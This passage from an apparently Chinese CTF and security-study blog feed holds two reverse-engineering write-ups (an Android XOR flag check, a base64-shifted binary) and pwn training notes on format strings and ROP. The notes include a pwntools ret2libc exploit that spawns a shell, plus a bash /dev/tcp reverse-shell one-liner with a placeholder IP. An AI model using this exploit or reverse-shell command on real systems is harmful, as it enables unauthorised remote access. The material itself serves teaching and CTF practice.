        <content type="html"><![CDATA[<p><strong>题目：specialapk</strong></p><p>程序下载:<a href="special_apk.zip">specialapk</a></p><span id="more"></span><p>jadx查看apk查看MainActivity</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyapk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">c</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">c</span>();</span><br><span class="line">    <span class="comment">/* access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> EditText edt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">a</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="type">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.edt = (EditText) findViewById(R.id.flag);</span><br><span class="line">        <span class="built_in">this</span>.btn = (Button) findViewById(R.id.btn);</span><br><span class="line">        <span class="built_in">this</span>.btn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.easyapk.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                System.out.println(MainActivity.<span class="built_in">this</span>.a());</span><br><span class="line">                System.out.println(MainActivity.<span class="built_in">this</span>.edt.getText().toString());</span><br><span class="line">                System.out.println(MainActivity.<span class="built_in">this</span>.ccc.cc(MainActivity.<span class="built_in">this</span>.edt.getText().toString(), MainActivity.<span class="built_in">this</span>.a()));</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.ccc.cc(MainActivity.<span class="built_in">this</span>.edt.getText().toString(), MainActivity.<span class="built_in">this</span>.a())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;正确！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;错误！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，是java+so的套路，输入与native-lib数据做比对，看关键代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyapk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span>[] ee = &#123;<span class="string">&#x27;@&#x27;</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="string">&#x27;)&#x27;</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">13</span>&#125;; <span class="comment">//key</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Multiple debug info for r4v2 char[]: [D(&#x27;j&#x27; int), D(&#x27;dd&#x27; char[])] */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">cc</span><span class="params">(String a1, String a2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] aa = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="comment">// 验证长度</span></span><br><span class="line">        <span class="keyword">if</span> (a1.length() != <span class="number">16</span> || a2.length() != <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(a1); <span class="comment">//输入字符串</span></span><br><span class="line">        System.out.println(a2); <span class="comment">//jni生成字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">            aa[i] = (<span class="type">char</span>) (a1.charAt(i) ^ a2.charAt(i)); <span class="comment">//jni生成字符串与输入xor</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(aa);</span><br><span class="line">        <span class="type">char</span>[] bb = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            bb[j * <span class="number">2</span>] = aa[(j * <span class="number">2</span>) + <span class="number">1</span>]; <span class="comment">//交换奇偶</span></span><br><span class="line">            bb[(j * <span class="number">2</span>) + <span class="number">1</span>] = aa[j * <span class="number">2</span>]; <span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] dd = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">15</span>; s &gt;= <span class="number">0</span>; s--) &#123;</span><br><span class="line">            dd[s] = bb[<span class="number">15</span> - s];   <span class="comment">//逆序</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">0</span>; y &lt; <span class="number">16</span>; y++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dd[y] != <span class="built_in">this</span>.ee[y]) &#123; <span class="comment">//比对</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密方法有了，key也知道了，找到加密后的字符串解密就可以了，这题直接有输出，看输出就可以。没有模拟器和logcat环境的直接ida里看也可以。用了NewStringUTF8(a1,”easyapk_is_great”)这个function。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.example.easyapk I/System.out: 1234567890123456</span><br><span class="line">com.example.easyapk I/System.out: easyapk_is_great</span><br></pre></td></tr></table></figure><p>直接跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">ee = [<span class="number">64</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">49</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">41</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">13</span>] <span class="comment"># 方便起见把char都转换成了int</span></span><br><span class="line">encStr = <span class="string">&#x27;easyapk_is_great&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deFlag</span>(<span class="params">encStr</span>):</span><br><span class="line">    aa = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    a1 = []</span><br><span class="line">    a2 = []</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encStr)):</span><br><span class="line">        a2.append(<span class="built_in">ord</span>(encStr[i]))</span><br><span class="line">    bb = ee[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        aa[i*<span class="number">2</span>] = bb[(i*<span class="number">2</span>)+<span class="number">1</span>]</span><br><span class="line">        aa[(i*<span class="number">2</span>)+<span class="number">1</span>] = bb[i*<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        a1.append(aa[i]^a2[i])</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> a1:</span><br><span class="line">        flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(a))</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> deFlag(encStr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./solve.py</span><br><span class="line">flag&#123;javaandso!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蒙古马2020 Wirteups:reverse-rev</title>
      <link href="/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-rev/"/>
      <url>/2020/09/13/%E8%92%99%E5%8F%A4%E9%A9%AC2020-Wirteups-reverse-rev/</url>
      
        <content type="html"><![CDATA[<p><strong>题目：rev</strong></p><p>程序下载:<a href="rev.rar">rev</a></p><blockquote><p>hint:yyyymmdd</p></blockquote><span id="more"></span><h1 id="0x00-暴力破解压缩包"><a href="#0x00-暴力破解压缩包" class="headerlink" title="0x00 暴力破解压缩包"></a>0x00 暴力破解压缩包</h1><p>根据提示yyyymmdd可知解压密码为8位年份，暴力破解得到解压密码</p><blockquote><p>20200601</p></blockquote><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><p>解压程序看一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rev.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>我的环境是ubuntu，wine运行发现少两个dll文件，导入运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine rev.exe</span><br><span class="line">please enter the flag:xxx <span class="comment">#输入xxx</span></span><br><span class="line">wrong flag!</span><br></pre></td></tr></table></figure><p><strong>IDA分析</strong></p><p>看到_main跳转到_main_0，直接跟进F5看伪代码</p><p><img src="ida_main.png" alt="ida_main"></p><p><img src="ida_main_0.png" alt="ida_main_0"></p><p>查看关键function</p><p><img src="ida_base64encode.png" alt="ida_b64encode"></p><p>显然是base64加密，再将加密结果strcpy到Dest上，再经过一道加密算法把Dest的每一byte加j，再与Str2比对。</p><p>看一下Str2的值：</p><p><img src="ida_str2.png" alt="ida_str2"></p><p><strong>注意：</strong> 这里’\x84’不能被解析所以Str2的长度应为20。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Str2 = <span class="string">&#x27;Znzk^8zuUMLvndT\x84vBOP&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="0x02-python脚本"><a href="#0x02-python脚本" class="headerlink" title="0x02 python脚本"></a>0x02 python脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;Znzk^8zuUMLvndT\x84vBOP&#x27;</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">     tmp+=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i])-i))</span><br><span class="line">flag = base64.b64decode(tmp)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./exp.py</span><br><span class="line">flag&#123;g00dman</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTU STCS 2016学习笔记 0x04 Format String</title>
      <link href="/2020/08/30/ntu-stcs-2016-w6/"/>
      <url>/2020/08/30/ntu-stcs-2016-w6/</url>
      
        <content type="html"><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><ul><li><em>在输出火字符串处理函数中用来表示输出的字符串格式</em></li><li><em>在以下的”%s %d”即为format string</em></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d\n&quot;</span>, str, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s %d\n&quot;</span>, str, a);</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%s %d\n&quot;</span>, str, a);</span><br></pre></td></tr></table></figure><h2 id="Format-String-Vulnerablility"><a href="#Format-String-Vulnerablility" class="headerlink" title="Format String Vulnerablility"></a>Format String Vulnerablility</h2><ul><li><em>错误的使用方式，直接将使用者的输入作为fmt使用</em></li><li><em>将printf(“%s”, str)，写成gets(str);printf(str);</em></li><li><em>此类错误不易发现，因为如果没有测试特殊input执行结果不变</em></li></ul><h2 id="fmt使用方式"><a href="#fmt使用方式" class="headerlink" title="fmt使用方式"></a>fmt使用方式</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$*1$d&quot;</span>, width, num);</span><br></pre></td></tr></table></figure><ul><li><em>%2$制定要以%d输出的是第几个参数</em></li><li><em>1$制定要作为输出的长度是第几个参数</em></li><li><em>width = 10,num = 5时相当于printf(“%10d”, 5)</em></li></ul><p><img src="w6-fmt-stacktrace.png" alt="w6-fmt-stacktrace"></p><p><strong>例子:</strong><a href="fmt1">fmt1</a></p><p>source code</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">while</span>(gets(str)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fmt漏洞成因"><a href="#fmt漏洞成因" class="headerlink" title="fmt漏洞成因"></a>fmt漏洞成因</h2><ul><li><em>format string可以被攻击者的输入人以控制，而printf本身不会检查后面有几个参数</em></li><li><em>使用%x会造成stack上的info leak</em></li><li><em>使用$控制要leak的位置</em></li></ul><p><strong>PS.：</strong> <em>x64的程序使用%lx</em></p><h2 id="leak-libc-base"><a href="#leak-libc-base" class="headerlink" title="leak libc base"></a>leak libc base</h2><ul><li><em>程序执行起点为_start，把main作为参数传入__libc_start_main</em></li><li><em>__libc_start_main会先完成初始化造作，之后call main函数</em></li><li><em>main的ret addr指向libc内部，且存放在stack上的值可以用%x泄露出来</em></li><li><em>leak出来的位数ec5和return会libc里的位置一致，但由于ASLR的关系使得高位随机</em></li><li><em>会return的位置会在call exit前面一些</em></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./fmt1</span><br><span class="line">%21<span class="variable">$lx</span></span><br><span class="line">7f0438b721e3</span><br></pre></td></tr></table></figure><h1 id="stackguard-CANARY"><a href="#stackguard-CANARY" class="headerlink" title="stackguard(CANARY)"></a>stackguard(CANARY)</h1><ul><li>编译器对stack overflow的一种保护机制</li><li>在call函数时在stack上放的值</li><li>函数return时先检查CANARY是否被修改</li></ul><p><img src="w6-fmt-stackguard.png" alt="w6-fmt-stackguard"></p><p><img src="w6-fmt-canary.png" alt="w6-fmt-canary"></p><h2 id="Leak-StackGuard-Canary"><a href="#Leak-StackGuard-Canary" class="headerlink" title="Leak StackGuard Canary"></a>Leak StackGuard Canary</h2><p><img src="w6-fmt-leakcanary.png" alt="w6-fmt-leakcanary"></p><h2 id="利用leak-canary攻击"><a href="#利用leak-canary攻击" class="headerlink" title="利用leak canary攻击"></a>利用leak canary攻击</h2><p><img src="w6-fmt-attcanary.png" alt="w6-fmt-attcanary"></p>]]></content>
      
      
      <categories>
          
          <category> NTU STCS 2016学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTU STCS 2016学习笔记 0x03 ROP2</title>
      <link href="/2020/08/29/ntu-stcs-2016-w5/"/>
      <url>/2020/08/29/ntu-stcs-2016-w5/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><ul><li>  <em>跳.plt entry</em></li><li>  <em>函数参数直接放到接下来的stack</em></li><li>  <em>用pop-ret处理用过的参数</em></li></ul><p><img src="w5-ropcall.png" alt="w5-ropcall"></p><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><ul><li>  <em>printf,gets,puts等函数所在位置:libc.so.6</em></li><li>  <em>直接用rop call libc 的system</em></li><li><em>用条件</em><ul><li>  <em>libc版本或者fuction的offset已知</em></li><li>  <em>ASLR开启情况</em></li></ul></li></ul><p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取libc路径</span></span><br><span class="line">ldd ./binary</span><br><span class="line"><span class="comment"># 查看libc中的相对位置</span></span><br><span class="line"><span class="comment"># trick 使用 | grep &#x27; system@&#x27;来查看想找的symbol</span></span><br><span class="line">readelf -s /lib32/libc.so.6 | grep <span class="string">&#x27; system@&#x27;</span></span><br><span class="line"><span class="comment"># 指定加载的libc位置</span></span><br><span class="line">LD_LIBRARY_PATH=./path/to/libc</span><br></pre></td></tr></table></figure><p><strong>Function Lazy Binding</strong></p><p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p><p><strong>推算libc base addr</strong></p><ul><li><em>函数在libc的相对位置不变</em><ul><li>  <em>使用readelf得知__libc_start_main和system在libc的相对位置</em></li></ul></li><li><em>使用任意输入函数print出__libc-start_main的.got内容，推算system在内存的addr</em><ul><li>  <em>用rop构造puts(__libc_start_main@got)</em></li><li>  <em>要leak的got entry,对应的function必须已经被call过</em></li></ul></li><li>  <em>前提：已有或已知远端libc.so.6版本</em></li></ul><p><strong>Libc Data Base</strong></p><ul><li><p><em>已知两个function的address时可以在libcdb里找对应的版本</em></p><ul><li>  <em><del>✘网站：libcdb.com:the libc data base</del></em></li><li>  <em>✘网站：<a href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a></em></li><li>  <em>✔使用<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></li></ul>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)  </span><br></pre></td></tr></table></figure></li></ul><p><strong>Leak libc base</strong><br><em>一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(‘/bin/sh’)</em></p><p><strong>例子：</strong><a href="/uploads/codes/w5/ret2libc3">ret2libc3</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get shell&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>trick:开启reverse tcp shell(web同时适用)</strong><br>system(“bash -c ‘bash -i &gt;&amp; /dev/tcp/to.your.ip.addr/31337 0&gt;&amp;1’”)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/31337 0&gt;&amp;1&#x27;&quot;)</span></span><br><span class="line">nc -vlp 31337</span><br></pre></td></tr></table></figure><h1 id="ROP-for-x86-64"><a href="#ROP-for-x86-64" class="headerlink" title="ROP for x86-64"></a>ROP for x86-64</h1><p><strong>64-bin ROP</strong></p><ul><li>  <em>syscall 要用rax,rdi,rsi,rdx,rcx,r8,r9,syscall</em></li><li>  <em>Function call参数传递适用寄存器而不是栈 rdi,rsi,rdx,rcx,r8,r9</em></li><li>  <em>需要用pop-ret控制register，再接function address</em></li></ul><p><strong>64-bit register</strong></p><ul><li>  <em>rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi</em></li><li>  <em>r8-r15是用前8个加上rex prefix来表示</em></li><li>  <em>r12-r15是callee saved，所以pop r12 - r15在function return前很常见</em></li><li>  <em>pop r14 = 415e / pop rsi = 5e</em></li><li>  <em>pop r15 = 415f / pop rdi = 5f</em></li></ul><p><strong>ROPgadget</strong><br>ROPgadget预设的搜索长度对64位来说可能不太够，需要增加–depth</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./binary --depth 100</span><br></pre></td></tr></table></figure><p><strong>通用gadget</strong></p><ul><li>  <em>64bit rop需要gadget控制参数</em></li><li>  <em>gcc的程序中有一些片段一定会有，可以用来做rop，构造ret2lib不是问题</em></li></ul><p><img src="w5-x64-rdi-rsi.png" alt="w5-x64-rdi-rsi"></p><p><img src="w5-x64-rdi.png" alt="w5-x64-rdi"></p><p><img src="w5-x64-rax.png" alt="w5-x64-rax"></p><p><img src="w5-x64-rcx.png" alt="w5-x64-rcx"></p><p><img src="w5-x64-rax2mem.png" alt="w5-x64-rax2mem"></p><p><strong>De-ASLR with ROP</strong><br><em>Calculate Runction Address without Information Leakage</em></p><p><img src="w5-deaslr.png" alt="w5-deaslr"></p><p><img src="w5-dl-rtresov.png" alt="w5-dl-rtresov"></p><p><strong>Linux 常用保护机制开关方法</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cannary 栈保护</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment"># 默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c  <span class="comment">#启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FORTIFY 检查是否存在缓冲区溢出的错误</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，不会开这个检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c  <span class="comment">#较弱的检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c  <span class="comment">#较强的检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NX（DEP）No-eXecute</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c  <span class="comment">#禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c  <span class="comment">#开启NX保护</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PIE（ASLR）</span></span><br><span class="line"><span class="comment"># liunx下关闭PIE的命令</span></span><br><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment"># gcc编译命令</span></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，不开启PIE</span></span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIE，此时强度为1</span></span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIE，此时为最高强度2</span></span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIC，此时强度为1，不会开启PIE</span></span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c  <span class="comment">#开启PIC，此时为最高强度2，不会开启PIE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RELRO</span></span><br><span class="line">gcc编译：</span><br><span class="line"></span><br><span class="line">gcc -o <span class="built_in">test</span> test.c  <span class="comment">#默认情况下，是Partial RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c  <span class="comment">#关闭，即No RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c  <span class="comment">#部分开启，即Partial RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c  <span class="comment">#全部开启，即full RELRO</span></span><br></pre></td></tr></table></figure><p><strong>例子:</strong><a href="/uploads/codes/w5/gets">gets</a> <a 